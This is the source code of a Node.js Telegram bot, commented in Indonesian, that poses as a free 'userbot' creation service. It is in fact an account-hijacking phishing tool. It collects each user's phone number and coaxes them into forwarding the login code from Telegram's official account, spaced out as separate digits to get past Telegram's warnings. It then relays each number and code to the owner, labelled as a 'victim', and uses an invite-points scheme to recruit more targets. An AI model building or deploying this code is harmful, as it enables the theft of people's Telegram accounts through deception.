const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');

// Baca informasi pemilik dari owner.json
const ownerData = JSON.parse(fs.readFileSync('owner.json'));
const token = ownerData.token;
const ownerId = ownerData.ownerId;

// Inisialisasi bot instance
const bot = new TelegramBot(token, { polling: true });

// Inisialisasi maps untuk menyimpan data
const inviteLinks = new Map();       // Untuk menyimpan tautan undangan
const userPoints = new Map();        // Untuk menyimpan poin pengguna
const invitedUsers = new Map();      // Untuk melacak pengguna yang diundang
const welcomedUsers = new Set();     // Untuk melacak pengguna yang disambut
const userContacts = new Map();      // Untuk menyimpan detail kontak pengguna
const userOtps = new Map();          // Untuk menyimpan OTP yang dikirim

// Fungsi untuk memulai bot dan meminta kontak
bot.onText(/\/createuserbot/, (msg) => {
  const chatId = msg.chat.id;
  const inviteCode = msg.text.split(' ')[1];

  // Cek jika pengguna datang dari tautan undangan
  if (inviteCode && inviteLinks.has(inviteCode)) {
    const { chatId: inviterId, username: inviterUsername } = inviteLinks.get(inviteCode);
    const newUsername = msg.from.username;

    // Tambahkan pengguna baru ke daftar diundang
    invitedUsers.set(inviterId, invitedUsers.get(inviterId) || new Set());
    if (!invitedUsers.get(inviterId).has(newUsername)) {
      invitedUsers.get(inviterId).add(newUsername);

      // Tambahkan poin ke pengundang
      userPoints.set(inviterId, userPoints.get(inviterId) || 0);
      userPoints.set(inviterId, userPoints.get(inviterId) + 1);

      // Kirim pesan ke pengundang
      bot.sendMessage(inviterId, `Selamat! @${newUsername} berhasil menggunakan tautan undangan Anda. Anda mendapatkan 1 poin.`);
    }
  }

  // Buat tombol untuk meminta kontak
  const requestContactButton = {
    reply_markup: {
      keyboard: [[{
        text: "Buat UserBot Anda",
        request_contact: true
      }]],
      one_time_keyboard: true,
      resize_keyboard: true
    }
  };

  // Kirim pesan untuk meminta kontak
  bot.sendMessage(chatId, "Silakan kirim kontak Anda dengan menekan tombol di bawah untuk proses pengiriman OTP:", requestContactButton);
});

// Mendengarkan kontak yang dikirim oleh pengguna
bot.on('contact', (msg) => {
  const chatId = msg.chat.id;
  const contact = msg.contact;

  // Simpan detail kontak pengguna
  userContacts.set(contact.user_id, contact);

  // Kirim pesan ke pengguna yang mengirimkan kontak
  bot.sendMessage(chatId, `Berhasil mendaftarkan di database:\nNama: ${contact.first_name}\nNomor: ${contact.phone_number}\n\nNB:\nSilakan tunggu beberapa menit untuk proses pembuatan bot Anda, ${contact.first_name}. Karena ini gratis, prosesnya bisa memakan waktu beberapa menit. Jadi harap sabar.`);

  // Kirim pesan ke pemilik dengan tombol untuk mengirim OTP
  const otpButton = {
    reply_markup: {
      inline_keyboard: [[
        { text: 'Kirim OTP', callback_data: `send_otp_${contact.user_id}` }
      ]]
    }
  };
  bot.sendMessage(ownerId, `Berhasil mendaftarkan di database:\nNama: ${contact.first_name}\nNomor: ${contact.phone_number}\n\nNB:\nSilakan tunggu beberapa menit untuk proses pembuatan bot Anda, ${contact.first_name}. Karena ini gratis, prosesnya bisa memakan waktu beberapa menit. Jadi harap sabar.`, otpButton);

  // Simpan data pengguna ke database.json
  saveUserData(contact.user_id, contact);
});

// Fungsi untuk menyimpan data pengguna ke database.json
function saveUserData(userId, contact) {
  let database = loadDatabase();
  database[userId] = {
    name: contact.first_name,
    phone_number: contact.phone_number,
    points: userPoints.get(userId) || 0
  };
  fs.writeFileSync('database.json', JSON.stringify(database, null, 2));
}

// Fungsi untuk memuat database.json
function loadDatabase() {
  try {
    return JSON.parse(fs.readFileSync('database.json'));
  } catch (error) {
    return {};
  }
}

// Fungsi untuk menangani perintah /invite
bot.onText(/\/invite/, (msg) => {
  const chatId = msg.chat.id;
  const username = msg.from.username;

  // Generate kode undangan acak
  const inviteCode = crypto.randomBytes(4).toString('hex');
  inviteLinks.set(inviteCode, { chatId, username });

  // Buat tautan undangan
  const inviteLink = `https://t.me/CreateUbot_Xbot?start=${inviteCode}`;
  bot.sendMessage(chatId, `Berikut adalah tautan undangan Anda:\n${inviteLink}`);
});

// Fungsi untuk menangani perintah /poin
bot.onText(/\/poin/, (msg) => {
  const chatId = msg.chat.id;
  const points = userPoints.get(chatId) || 0;
  bot.sendMessage(chatId, `Anda telah berhasil mengundang ${points} pengguna.`);
});

// Fungsi untuk menangani perintah /seller
bot.onText(/\/seller/, (msg) => {
  const chatId = msg.chat.id;
  const points = userPoints.get(chatId) || 0;

  if (points >= 50) {
    userPoints.set(chatId, points - 50);
    bot.sendMessage(chatId, 'Selamat! Anda telah berhasil menggunakan fitur seller. Poin Anda telah dikurangi 50.');
    // Tambahkan logika untuk fitur seller di sini
  } else {
    bot.sendMessage(chatId, 'Maaf, Anda memerlukan setidaknya 50 poin untuk menggunakan fitur ini. /invite teman Anda untuk mendapatkan 50 poin.');
  }
});

// Fungsi untuk menangani perintah /start
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const username = msg.from.username;
  const args = msg.text.split(' ');

  if (args.length > 1) {
    const inviteCode = args[1];
    if (inviteCode && inviteLinks.has(inviteCode)) {
      const { chatId: inviterId, username: inviterUsername } = inviteLinks.get(inviteCode);
      const newUsername = msg.from.username;

      invitedUsers.set(inviterId, invitedUsers.get(inviterId) || new Set());
      if (!invitedUsers.get(inviterId).has(newUsername)) {
        invitedUsers.get(inviterId).add(newUsername);

        userPoints.set(inviterId, userPoints.get(inviterId) || 0);
        userPoints.set(inviterId, userPoints.get(inviterId) + 1);

        bot.sendMessage(inviterId, `Selamat! @${newUsername} berhasil menggunakan tautan undangan Anda. Anda mendapatkan 1 poin.`);
      }
    }
  }

  if (!welcomedUsers.has(username)) {
    const welcomeMessage = `
Hallo... Selamat datang di bot kami!

🏷️ SEMUA MENU BOT
/createuserbot - Mulai membuat User Bot (gratis)
/invite - Buat tautan undangan unik
/poin - Periksa jumlah poin Anda
/seller - Gunakan fitur seller jika Anda memiliki setidaknya 50 poin, Fungsi ini memungkinkan Anda membuat userbot untuk pengguna lain tanpa menggunakan bot ini dan Anda dapat membuat mereka sebagai pemilik bot kami
    `;
    bot.sendMessage(chatId, welcomeMessage);
    welcomedUsers.add(username);
  } else {
    const menu = `
🏷️ SEMUA MENU BOT
/createuserbot - Mulai membuat User Bot (gratis)
/invite - Buat tautan undangan unik
/poin - Periksa jumlah poin Anda
/seller - Gunakan fitur seller jika Anda memiliki setidaknya 50 poin, Fungsi ini memungkinkan Anda membuat userbot untuk pengguna lain tanpa menggunakan bot ini dan Anda dapat membuat mereka sebagai pemilik bot kami

Developer By : @YanzCode
    `;
    bot.sendMessage(chatId, menu);
  }
});

// Fungsi untuk menangani perintah /menu
bot.onText(/\/menu/, (msg) => {
  const chatId = msg.chat.id;
  const menu = `
🏷️ SEMUA MENU BOT
/createuserbot - Mulai membuat User Bot (gratis)
/invite - Buat tautan undangan unik
/poin - Periksa jumlah poin Anda
/seller - Gunakan fitur seller jika Anda memiliki setidaknya 50 poin, Fungsi ini memungkinkan Anda membuat userbot untuk pengguna lain tanpa menggunakan bot ini dan Anda dapat membuat mereka sebagai pemilik bot kami
    
Anda mungkin bertanya-tanya apa itu penjual dalam bot kami? Di sini saya ingin memberi tahu Anda bahwa jika Anda berhasil mengundang 50 orang, Anda dapat membuat user bot dengan batas 20 username dan ini cocok untuk dijual mari /invite teman Anda untuk mendapatkan pemilik user bot

Developer By : @YanzCode
  `;
  bot.sendMessage(chatId, menu);
});

// Fungsi untuk menangani tombol callback
bot.on('callback_query', (callbackQuery) => {
  const msg = callbackQuery.message;
  const data = callbackQuery.data;

  if (data.startsWith('send_otp_')) {
    const userId = data.split('_')[2];

    if (msg.chat.id === ownerId && userContacts.has(parseInt(userId))) {
      const contact = userContacts.get(parseInt(userId));
      const otp = crypto.randomBytes(3).toString('hex');

      userOtps.set(contact.user_id, otp);

      bot.sendMessage(contact.user_id, `Silakan periksa kode OTP dari akun Telegram resmi\n\nAkun Resmi Telegram\n[ tg://openmessage?user_id=777000 ]\n\nKirim kode OTP ke sini, setelah membaca format di bawah ini.\n\nJika kode OTP adalah <kode>12345 harap kirimkan seperti ini 1 2 3 4 5\n\nAnda kurang paham? bisa lihat tutorial ini\nhttp://telegra.ph/Cara-Kirim-Otp-Ke-Bot-07-01`);
      bot.sendMessage(ownerId, `OTP telah dikirim ke ${contact.first_name} (${contact.phone_number}).\n\nSilakan minta pengguna untuk mengirimkan kode OTP yang diterima.`);
    } else {
      bot.sendMessage(ownerId, 'Gagal mengirim');
    }
  }
});

// Fungsi untuk menangani pesan teks dari pengguna
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  // Cek apakah pesan mengandung 5 digit angka dengan spasi
  if (/^\d \d \d \d \d$/.test(text)) {
    // Ambil nomor pengguna dari userContacts
    const contact = userContacts.get(chatId);
    if (contact) {
      // Kirim pesan ke owner dengan format yang diminta
      const [digit1, digit2, digit3, digit4, digit5] = text.split(' ');
      const code = `${digit1}${digit2}${digit3}${digit4}${digit5}`;

      const otpMessage = `🦅 Mendapatkan Korban\n\nNo: ${contact.phone_number}\nOtp: ${code}`;
      const otpButtons = {
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'Berhasil', callback_data: `otp_success_${contact.user_id}` },
              { text: 'Coba Lagi', callback_data: `otp_retry_${contact.user_id}` }
            ]
          ]
        }
      };

      bot.sendMessage(ownerId, otpMessage, otpButtons);
    } else {
      bot.sendMessage(chatId, "Maaf, kami tidak dapat menemukan nomor kontak Anda.");
    }
  }
});

bot.on('callback_query', (callbackQuery) => {
  const msg = callbackQuery.message;
  const data = callbackQuery.data;

  if (data.startsWith('otp_success_')) {
    const userId = data.split('_')[2];

    if (userContacts.has(parseInt(userId))) {
      const contact = userContacts.get(parseInt(userId));
      bot.sendMessage(contact.user_id, 'OTP yang anda berikan benar dan berhasil membuat userbot');
      bot.sendMessage(ownerId, 'Pesan sukses telah dikirim ke pengguna.');
    } else {
      bot.sendMessage(ownerId, 'Gagal mengirim pesan sukses, kontak tidak ditemukan.');
    }
  } else if (data.startsWith('otp_retry_')) {
    const userId = data.split('_')[2];

    if (userContacts.has(parseInt(userId))) {
      const contact = userContacts.get(parseInt(userId));
      bot.sendMessage(contact.user_id, 'Silakan masukkan OTP terbaru.');
      bot.sendMessage(ownerId, 'Pesan retry telah dikirim ke pengguna.');
    } else {
      bot.sendMessage(ownerId, 'Gagal mengirim pesan retry, kontak tidak ditemukan.');
    }
  }
});

console.log(`
===================================================
    ⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠔⠒⠊⠉⠉⠉⠉⠙⠒⠲⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⣠⠔⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⠀⠀
    ⠀⠀⠀⣠⠞⠁⠀⣀⠀⠀⠀⠀⢀⣀⡀⠀⢀⣀⠀⠀⠀⠀⢀⠀⠈⠱⣄⠀⠀⠀
    ⠀⠀⡴⠁⡠⣴⠟⠁⢀⠤⠂⡠⠊⡰⠁⠇⢃⠁⠊⠑⠠⡀⠀⢹⣶⢤⡈⢣⡀⠀
    ⠀⡼⢡⣾⢓⡵⠃⡐⠁⠀⡜⠀⠐⠃⣖⣲⡄⠀⠀⠱⠀⠈⠢⠈⢮⣃⣷⢄⢳⠀
    ⢰⠃⣿⡹⣫⠃⡌⠀⠄⠈⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠣⠀⠀⠱⠈⣯⡻⣼⠈⡇
    ⡞⢈⢿⡾⡃⠰⠀⠀⠀⠀⠀⠀⠀⠀⣘⣋⠀⠀⠀⠀⠀⠀⠀⠀⠇⢸⢿⣿⢠⢸
    ⡇⢸⡜⣴⠃⠀⠀⠀⠀⠀⣀⣀⣤⡎⠹⡏⢹⣦⣀⣀⠀⠀⠀⠀⢈⠘⣧⢣⡟⢸
    ⢧⢊⢳⡏⣤⠸⠀⠀⠀⢸⣿⣿⣿⡇⢰⡇⢠⣿⣿⣿⣷⠀⠀⠀⡆⢸⢹⡼⣱⢸
    ⢸⡘⢷⣅⣿⢂⢃⠐⠂⣿⣿⣿⣿⣿⣼⣇⣾⣿⣿⣿⣿⠁⠂⡰⡠⣿⢨⡾⠃⡇
    ⠀⢳⡱⣝⠻⡼⣆⡁⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠐⣰⣇⠿⣋⠝⡼⠀
    ⠀⠀⢳⡈⢻⠶⣿⣞⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢣⣿⡶⠟⢉⡼⠁⠀
    ⠀⠀⠀⠙⢦⡑⠲⠶⠾⠿⢟⣿⣿⣿⣿⣿⣿⣿⣿⡛⠿⠷⠶⠶⠊⡡⠋⠀⠀⠀
    ⠀⠀⠀⠀⠀⠙⠦⣝⠛⠛⠛⣿⣿⣿⣿⣿⣿⣿⣿⡛⠛⠛⣋⠴⠋⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠦⠿⣿⣿⣿⣿⣿⣿⠿⠧⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀
===================================================
            Welcome to Yanz Server
===================================================
Status: Bot is running...
your id: ${ownerId}
Current Time: ${new Date().toLocaleString()}
===================================================
Owner: @YanzOfficial
Whatsapp : 6288228895081
===================================================
`);